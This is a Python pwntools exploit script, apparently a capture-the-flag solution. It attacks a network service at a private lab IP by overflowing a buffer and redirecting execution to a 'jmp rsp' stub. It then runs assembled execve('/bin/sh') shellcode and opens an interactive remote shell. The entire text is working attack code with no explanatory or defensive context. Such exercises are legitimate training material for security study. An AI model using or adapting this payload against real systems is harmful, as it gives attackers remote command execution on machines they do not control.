#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.6"
port = 8888

context.arch = "amd64"    
r = remote(host,port)
r.recvuntil(":")
sc = asm("""
    jmp rsp
""")
r.sendline(sc)
r.recvuntil(":")
Name = 0x601060
# execve("/bin/sh",0,0)
sc2 = asm("""
    jmp sh
execve :
    pop rdi
    xor rsi,rsi
    xor rdx,rdx
    mov rax,0x3b
    syscall

sh :
    call execve
    .ascii "/bin/sh"
    .byte 0
""")
r.sendline("a"*24 + p64(Name) + sc2)
r.interactive()
